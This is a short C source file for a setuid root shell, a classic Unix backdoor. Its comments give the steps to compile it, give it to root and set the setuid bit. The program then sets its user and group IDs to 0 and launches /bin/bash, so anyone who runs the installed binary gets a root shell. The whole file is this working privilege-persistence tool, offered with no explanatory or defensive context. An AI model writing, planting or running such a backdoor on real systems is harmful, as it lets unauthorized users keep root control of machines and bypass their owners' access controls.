// gcc -o powerup setuid_shell.c
// chown root powerup
// chmod u+s powerup
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
